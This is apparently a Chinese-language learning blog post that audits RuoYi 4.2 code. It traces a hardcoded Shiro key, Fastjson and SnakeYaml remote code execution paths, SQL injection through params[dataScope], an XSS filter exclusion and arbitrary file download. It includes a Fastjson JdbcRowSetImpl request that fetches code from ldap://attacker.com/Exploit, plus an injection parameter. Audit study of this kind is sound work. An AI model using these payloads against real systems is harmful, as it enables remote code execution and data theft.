---
title: RuoYi-4.2代码审计
author: Creexile
date: 2025-08-22
lastMod: 2025-08-23
summary: '有什么单词以n开头g结尾, 当然是nothing'
cover: ''
category: 'Java安全'
draft: false
comments: false
sticky: 0
tags: [Java, 代码审计]
---

代码审计入门promax

参考文章

1. [csdn-ruoyi若依4.6.0SQL注入代码审计（小白向 部署+源码审计）](https://blog.csdn.net/2301_79545986/article/details/150265995)
2. [ruoyi-环境部署](https://doc.ruoyi.vip/ruoyi/document/hjbs.html#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C)
3. [pdf-RuoYi 4.2代码审计案例](RuoYi%204.2代码审计案例.pdf)
4. [先知社区-【代码审计】若依后台管理系统](https://xz.aliyun.com/news/11374)
5. [Java 反序列化漏洞始末（5）— XML/YAML](https://b1ue.cn/archives/239.html)
6. [先知社区-若依cms代码审计+不同版本漏洞复现](https://xz.aliyun.com/news/15463)
7. [奇安信攻防社区-若依(RuoYi)框架漏洞战争手册](https://forum.butian.net/share/4328)
8. [代码审计学习-若依框架](https://blog.51cto.com/u_9652359/13077192)
9. 还有doc文件夹中的若依环境使用手册

# 环境搭建

```
Ruoyi：4.2
MYSQL: 8.0.32 MySQL Community Server
JDK: jdk-8u161-windows--64 （⼀定不要使⽤⾼版本jdk不然利⽤链⽆法利⽤） MAVEN: apache-maven-3.2.3-bin
```

jdk要手动配置是真的

**安装依赖**
右键pom.xml选择maven选择生成源代码并更新文件夹,更新完成后选择同步项目

**配置数据库**
开启你的mysql数据库并创建名为ry的数据库, 在该库中执行sql文件夹内的`quartz.sql`和`ry_20200323.sql`

修改`ruoyi-admin/src/main/resources/application-druid.yml`第10行和第11行数据库账密, 或者你直接在数据库中新增也行

**启动服务器**
启动`ruoyi-admin/src/main/java/com/ruoyi/RuoYiApplication.java`, 出现该文件内的内容即可确认正常启动

现在开始你的代码审计

# 前置知识

[代码审计前置](../../../代码审计/代码审计前置.md)

# 代码审计

## 信息收集

我说信息收集是安全的底层逻辑

存在pom.xml可以对内容进行审计, 如果用的是IDEA, 有一个易受攻击的依赖项, 你可以看哪些有漏洞

```
java 1.8
shiro 1.4.2 - 存在
thymeleaf 2.0.0 - 存在
mybatis 1.3.2
druid 1.1.14
bitwalker 1.19
kaptcha 2.3.2
swagger 2.9.2
pagehelper 1.2.5
fastjson 1.2.60 - 存在
oshi 3.9.1
commons.io 2.5 - 存在
commons.fileupload 1.3.3
poi 3.17 - 存在
velocity 1.7 - 存在
snakeyaml - 存在

SpringBoot 2.1.1.RELEASE
```

也可以从README中获取信息, 搭好网站登陆进去就能看到了

```
核心框架：Spring Boot。
安全框架：Apache Shiro。
模板引擎：Thymeleaf。
持久层框架：MyBatis。
定时任务: Quartz。
数据库连接池：Druid。
工具类：Fastjson。
更多:...
```

## 通读全文

不要问通读全文, 我没那个能力

`ruoyi-admin\src\main\java\com\ruoyi\web\controller\`
控制层

`ruoyi-system\src\main\java\com\ruoyi\system\`
领域模型层

## 手工

真干起来肯定是用工具直接干, 然后看工具有无误报; 练习就从头开始

不借助工具那就是: 组件漏洞->关键词审计->从路由整过去

比较快的方式是利用从`pom.xml`中获取的信息, 先对组件进行审计

那就从最简单的shiro开始吧

### 组件漏洞

#### shiro

关键词`setCipherKey`或`CookieRememberMeManager`

`RuoYi-v4.2\ruoyi-framework\src\main\java\com\ruoyi\framework\config\ShiroConfig.java`
该文件中第331行出现了硬编码密钥

> 如果有环境, 那可以用工具打来试试; 如果没有, 那就只能单纯审计代码

不过组件漏洞一般会有那种漏洞复现里面带着代码分析, 比如说这个:[freebuf-Shiro组件漏洞与攻击链分析](https://www.freebuf.com/articles/web/252539.html)

#### Thymeleaf

不知道就去找找呗, 比如说这个[csdn-Thymeleaf模板注入漏洞总结及修复方法（上篇）](https://blog.csdn.net/m0_71692682/article/details/130538310)

由于使用了这个模板引擎, 所以部分前置知识需要知晓[Thymeleaf模板注入](../../../Java安全/组件漏洞/Thymeleaf模板注入.md), 寻找漏洞便容易许多

结合上面的知识, 没有找到利用点, 若依v4.7.1据说存在, 以后看看

#### fastjson

Fastjson <= 1.2.68 RCE

找`parseObject`关键词, 文中仅有`JSONObject.parseObject`方法

当你调用 `JSONObject.parseObject(result)` 时，实际上是调用了 `JSON` 类中的 `parseObject(String text)` 方法, 同样可以触发反序列化

> `JSONObject` 是 `JSON` 类的子类或它的一部分，所以它会直接继承或使用父类的方法

此处存在的两个java路径:

- `RuoYi-v4.2\ruoyi-generator\src\main\java\com\ruoyi\generator\util\VelocityUtils.java`
- `RuoYi-v4.2\ruoyi-generator\src\main\java\com\ruoyi\generator\service\impl\GenTableServiceImpl.java`

`VelocityUtils.java`中, 代码和思路如下

```java
public static void setTreeVelocityContext(VelocityContext context, GenTable genTable)
{
    String options = genTable.getOptions();
    JSONObject paramsObj = JSONObject.parseObject(options);
    ...
}
```

1. 存在参数options -> 追溯参数
   - ctrl单击获取到函数 `genTable.getOptions()` 追溯该函数 `return options;`

```java
/** 其它生成选项 */
private String options;
```

看来没有收获, 仅知道了是用于 其它生成选项 的字段, 那我们转头去寻找功能点的调用

2. 位于函数`setTreeVelocityContext()` -> 追溯函数
   - 右键查找用法获取到函数`prepareContext()`

```java
    /**
     * 设置模板变量信息
     *
     * @return 模板列表
     */
    public static VelocityContext prepareContext(GenTable genTable)
    {
        //...
        if (GenConstants.TPL_TREE.equals(tplCategory))
        {
            setTreeVelocityContext(velocityContext, genTable);
        }
        return velocityContext;
    }
```

跟进常量`TPL_TREE`和参数`tplCategory`, 得知值`TPL_TREE`为tree, `tplCategory`注释为 使用的模板（crud单表操作 tree树表操作）, 结合代码, 当tplCategory值为tree的时候才会触发该方法

```
tplCategory = 'tree'; -> 调用setTreeVelocityContext()
```

回到`prepareContext()`, `GenTaleServiceImpl.java`中第187行和250行都有所调用, 先看187行

```java
    public Map<String, String> previewCode(Long tableId)
    {
        Map<String, String> dataMap = new LinkedHashMap<>();
        // 查询表信息
        GenTable table = genTableMapper.selectGenTableById(tableId);
        // 查询列信息
        List<GenTableColumn> columns = table.getColumns();
        setPkColumn(table, columns);
        VelocityInitializer.initVelocity();

        VelocityContext context = VelocityUtils.prepareContext(table);
        // ...
    }
```

table由`genTableMapper.selectGenTableById(tableId)`控制, 我们只能操控 tableId 参数

因为该参数在函数的形参中, 我们可以直接追溯函数`previewCode()`

> 如果对前面的函数感兴趣可以放鼠标上去, 应该会弹出注释

```java
    /**
     * 预览代码
     */
    @RequiresPermissions("tool:gen:preview")
    @GetMapping("/preview/{tableId}")
    @ResponseBody
    public AjaxResult preview(@PathVariable("tableId") Long tableId) throws IOException
    {
        Map<String, String> dataMap = genTableService.previewCode(tableId);
        return AjaxResult.success(dataMap);
    }
```

- 输入是简单类型（Long）且来自 URL 路径
- 攻击者无法注入恶意 JSON 负载

这条路算是走不通了; 我说代码审计就是这样的, 走了半天发现前面是一条死路, 王朝了

没事, 这里一共就两个触发点, 不是那种一大坨的

来看看`GenTableServiceImpl.java`

```java
    /**
     * 修改保存参数校验
     *
     * @param genTable 业务信息
     */
    public void validateEdit(GenTable genTable)
    {
        if (GenConstants.TPL_TREE.equals(genTable.getTplCategory()))
        {
            String options = JSON.toJSONString(genTable.getParams());
            JSONObject paramsObj = JSONObject.parseObject(options);
            // ...
        }
    }
```

options -> `JSON.toJSONString(genTable.getParams());` -> genTable

说明是这个函数的形参, 直接追踪函数调用

```java
    /**
     * 修改保存代码生成业务
     */
    @RequiresPermissions("tool:gen:edit")
    @Log(title = "代码生成", businessType = BusinessType.UPDATE)
    @PostMapping("/edit")
    @ResponseBody
    public AjaxResult editSave(@Validated GenTable genTable)
    {
        genTableService.validateEdit(genTable);
        genTableService.updateGenTable(genTable);
        return AjaxResult.success();
    }
```

- 使用 `@PostMapping`，接收POST请求
- 参数 `GenTable genTable` 通过 `@Validated` 注解，Spring会自动将请求体中的JSON数据反序列化为GenTable对象
- `validateEdit()`首先将参数转换为JSON字符串, 随后进行Fastjson反序列化

看回参考文章发现这里漏了`validateEdit()`函数的`genTable.getParams()`的分析,跟进发现直接返回一个`new HashMap<>()`

```java
    public Map<String, Object> getParams()
    {
        if (params == null)
        {
            params = new HashMap<>();
        }
        return params;
    }
```

在跟进params, 发现定义为`Map<String, Object>`, 可以理解为params字段中可以传任何类型的值在里面, 所以传入可以是恶意的字符串而不像第一条链一样只能是Long

尝试验证一下吧

```
POST /tool/gen/edit HTTP/1.1
Content-Type: application/json

{
  "tplCategory": "tree",
  "params": {
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com/Exploit",
    "autoCommit": true
  }
}
```

#### SnakeYaml

我直接找到了SnakeYaml和定时任务功能存在RCE, 正好之前是从关键函数倒头寻找实现再到路由, 现在从路由一路往下找关键函数

定时任务在ruoyi-quartz下, 先了解一下如何正向分析

流程: 控制层->服务层

首先关注控制层(controller), 它与前台交互并传输参数到服务(Service)层

ruoyi-quartz仅有两个控制的类, 根据注释描述, `SysJobLogController`是调度日志操作处理的类, 所以我们不需要再管, 去看`SysJobLogController`这个调度任务信息操作处理的类

结合功能, RCE需要被执行, 寻找到注释为"任务调度立即执行一次"的`run()`函数

```java
    /**
     * 任务调度立即执行一次
     */
    @Log(title = "定时任务", businessType = BusinessType.UPDATE)
    @RequiresPermissions("monitor:job:changeStatus")
    @PostMapping("/run")
    @ResponseBody
    public AjaxResult run(SysJob job) throws SchedulerException
    {
        jobService.run(job);
        return success();
    }
```

追踪函数里面的`jobService.run()`, 发现有一个实现

```java
/**
 * 立即运行任务
 *
* @param job 调度信息
 */
@Override
@Transactional
public void run(SysJob job) throws SchedulerException
{
    Long jobId = job.getJobId();
    SysJob tmpObj = selectJobById(job.getJobId());
    // 参数
    JobDataMap dataMap = new JobDataMap();
    dataMap.put(ScheduleConstants.TASK_PROPERTIES, tmpObj);
    scheduler.triggerJob(ScheduleUtils.getJobKey(jobId, tmpObj.getJobGroup()), dataMap);
}
```

首先通过调度任务ID查询调度信息, 可以跟进SysJob看看定时任务调度表的定义

然后实例化`JobDataMap`, 继承自`org.quartz.utils.StringKeyDirtyFlagMap`, 查看发现大概就是将信息(键值对)保存在里面

所以这个函数只是告诉Quartz调度器立即执行该任务; Quartz框架罪大恶极, 所以真正的执行不在这里

现在寻找Quartz执行器, 可以用关键词搜索:

```
QuartzJob
class QuartzJob
implements Job
extends Job
```

`QuartzJob`直接找到文件`QuartzJobExecution.java`

```java
/**
 * 定时任务处理（允许并发执行）
 *
 * @author ruoyi
 *
 */
public class QuartzJobExecution extends AbstractQuartzJob
{
    @Override
    protected void doExecute(JobExecutionContext context, SysJob sysJob) throws Exception
    {
        JobInvokeUtil.invokeMethod(sysJob);
    }
}
```

进入`JobInvokeUtil.invokeMethod()`, 发现该类解析并执行我们传入的数据, 反射调用相关的类

```java
    /**
     * 执行方法
     *
     * @param sysJob 系统任务
     */
    public static void invokeMethod(SysJob sysJob) throws Exception
    {
        String invokeTarget = sysJob.getInvokeTarget();
        String beanName = getBeanName(invokeTarget);    // 传入的类名
        String methodName = getMethodName(invokeTarget);    // 方法名
        List<Object[]> methodParams = getMethodParams(invokeTarget);    // 参数

        if (!isValidClassName(beanName))
        {
            Object bean = SpringUtils.getBean(beanName);
            invokeMethod(bean, methodName, methodParams);
        }
        else
        {
            Object bean = Class.forName(beanName).newInstance();
            invokeMethod(bean, methodName, methodParams);
        }
    }
```

调用的`invokeMethod()`函数如下

```java
    /**
     * 调用任务方法
     *
     * @param bean 目标对象
     * @param methodName 方法名称
     * @param methodParams 方法参数
     */
    private static void invokeMethod(Object bean, String methodName, List<Object[]> methodParams)
            throws NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException,
            InvocationTargetException
    {
        if (StringUtils.isNotNull(methodParams) && methodParams.size() > 0)
        {
            Method method = bean.getClass().getDeclaredMethod(methodName, getMethodParamsType(methodParams));
            method.invoke(bean, getMethodParamsValue(methodParams));
        }
        else
        {
            Method method = bean.getClass().getDeclaredMethod(methodName);
            method.invoke(bean);
        }
    }
```

[+]我们传入的是`java.lang.xxx.func('aaa')`

- `beanName = "java.lang.xxx"`
- `methodName = "func"`
- `methodParams = "aaa"`

最终执行的反射代码为：`Class.forName("java.lang.xxx").getDeclaredMethod("func", String.class).invoke(Class.forName("java.lang.xxx").newInstance(), "aaa")`

那么下面就是传入一个能够执行命令的类方法, `org.yaml.snakeyaml.Yaml`就满足这些条件, 所以就有了这个漏洞

### SQL注入

结合mybatis 1.3.2, 这里的关键词是`${`

之前一直在java中寻找, 搜索之后发现只有在xml中才会有这个关键词, 在java文件中依然以sql语句形式出现

```xml
	<select id="selectRoleList" parameterType="SysRole" resultMap="SysRoleResult">
		<include refid="selectRoleContactVo"/>
		where r.del_flag = '0'
        <!-- ... -->
		<!-- 数据范围过滤 -->
		${params.dataScope}
	</select>
```

可以根据最上面的`<mapper namespace="...">`寻找到对应的java文件
再根据这一段最上面的`<select id="selectRoleList" ...>`得到是`selectRoleList`函数

一路从 xml->数据访问层->服务层(业务层)->控制层

```
SysRoleMapper.xml -> SysRoleMapper.java -> SysRoleServiceImpl.java -> SysRoleController.java
```

一共两个地方在调用:

```java
    @RequiresPermissions("system:role:list")
    @PostMapping("/list")
    @ResponseBody
    public TableDataInfo list(SysRole role)
    {
        startPage();
        List<SysRole> list = roleService.selectRoleList(role);
        return getDataTable(list);
    }

    @Log(title = "角色管理", businessType = BusinessType.EXPORT)
    @RequiresPermissions("system:role:export")
    @PostMapping("/export")
    @ResponseBody
    public AjaxResult export(SysRole role)
    {
        List<SysRole> list = roleService.selectRoleList(role);
        ExcelUtil<SysRole> util = new ExcelUtil<SysRole>(SysRole.class);
        return util.exportExcel(list, "角色数据");
    }
```

先来看列表参数类型`SysRole`, 看看最开始的dataScope如何定义

```java
/** 数据范围（1：所有数据权限；2：自定义数据权限；3：本部门数据权限；4：本部门及以下数据权限） */
@Excel(name = "数据范围", readConverterExp = "1=所有数据权限,2=自定义数据权限,3=本部门数据权限,4=本部门及以下数据权限")
private String dataScope;
```

这一路无过滤无检查, 能直接控制, Controller直达利用点, 那打就行了

前端为角色管理, 但是前端抓包没有dataScope这个参数; 但是没事, 该接⼝接收的是⼀个SysRole对象, 可以接收DataScope这个参数;

```
roleName=&roleKey=&status=0&params%5BbeginTime%5D=&params%5BendTime%5D=&pageS ize=10&pageNum=1&orderByColumn=roleSort&isAsc=asc&params%5BdataScope%5D=*
```

另外一个路由同样, 所以交给sqlmap吧

### XSS

> 哈哈!参考文件中没有这个, 人家是用黑盒测出来的

先看看有没有filter, 一般的系统都会针对xss进行过滤

`src/main/java/com/ruoyi/common/xss/XssFilter.java`

下面是初始化代码, 初始化时获取了excludes和enabled变量

```java
@Override
public void init(FilterConfig filterConfig) throws ServletException
{
    String tempExcludes = filterConfig.getInitParameter("excludes");
    String tempEnabled = filterConfig.getInitParameter("enabled");
    // ...
}

@Override
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
        throws IOException, ServletException
{
    HttpServletRequest req = (HttpServletRequest) request;
    HttpServletResponse resp = (HttpServletResponse) response;
    if (handleExcludeURL(req, resp)) // excludes中的直接进if
    {
        chain.doFilter(request, response);
        return;
    }

private boolean handleExcludeURL(HttpServletRequest request, HttpServletResponse response)
{
    // ...
    String url = request.getServletPath();
    for (String pattern : excludes)
    {
        Pattern p = Pattern.compile("^" + pattern);
        Matcher m = p.matcher(url);
        if (m.find()) //匹配到子序列就返回true
        {
            return true;
        }
    }
    // ...
```

这个变量的来源需要全局搜索excludes, 到达下面这个

`src/main/java/com/ruoyi/framework/config/FilterConfig.java`

再追踪一下

`src/main/resources/application.yml`

```xml
# 防止XSS攻击
xss:
  # 过滤开关
  enabled: true
  # 排除链接（多个用逗号分隔）
  excludes: /system/notice/*
  # 匹配链接
  urlPatterns: /system/*,/monitor/*,/tool/*
```

所以排除链接为`/system/notice/*`, 在这个路径下进行xss的时候不会被过滤

结合这个去Controller寻找对应的接口即可

```
/system/notice 公告信息处理
/system/notice/edit
/system/notice/add
```

### 任意⽂件读取

从Controller下手

```java
    /**
     * 本地资源通用下载
     */
    @GetMapping("/common/download/resource")
    public void resourceDownload(String resource, HttpServletRequest request, HttpServletResponse response)
            throws Exception
    {
        // 本地资源路径
        String localPath = Global.getProfile();
        // 数据库资源地址
        String downloadPath = localPath + StringUtils.substringAfter(resource, Constants.RESOURCE_PREFIX);
        // 下载名称
        //拿到文件名
        String downloadName = StringUtils.substringAfterLast(downloadPath, "/");

        response.setCharacterEncoding("utf-8");
        response.setContentType("multipart/form-data");
        response.setHeader("Content-Disposition",
                "attachment;fileName=" + FileUtils.setFileDownloadHeader(request, downloadName));
        //文件下载
        FileUtils.writeBytes(downloadPath, response.getOutputStream());

    }
```

resource是我们可以传⼊的值 在第103⾏使⽤localPath和使⽤`StringUtils.substringAfter()`拼接形成新的路径

其中`StringUtils.substringAfter()`有两个参数，⼀个resource是我们可控的 Constants.RESOURCE_PREFIX是⼀个常量/profile; 该函数⽬的是获取到/profile后⾯的字符串

例如`http://127.0.0.1/?resource=/profile/1.txt`经过`StringUtils.substringAfter`⽅法处理后真正要下载的⽂件就是1.txt, 在构造payload时，要写成/profile/xxx

查看localPath是从哪⾥获取的

```java
/**
 * 全局配置类
 *
* @author ruoyi
 */@Component
@ConfigurationProperties(prefix = "ruoyi")
public class Global
{
    // ...
    public static String getProfile()
    {
        return profile;
    }
    // ...
}
```

`@ConfigurationProperties`说明Global的属性值是由yml⽂件中的ruoyi来提供的

来到`src/main/resources/application.yml`, 所以我们可以读取该⽬录下的⽂件

```xml
# 项目相关配置
ruoyi:
  # 名称
  name: RuoYi
  # 版本
  version: 4.2.0
  # 版权年份
  copyrightYear: 2019
  # 实例演示开关
  demoEnabled: true
  # 文件路径 示例（ Windows配置D:/ruoyi/uploadPath，Linux配置 /home/ruoyi/uploadPath）
  profile: D:/ruoyi/uploadPath
  # 获取ip地址开关
  addressEnabled: true
```
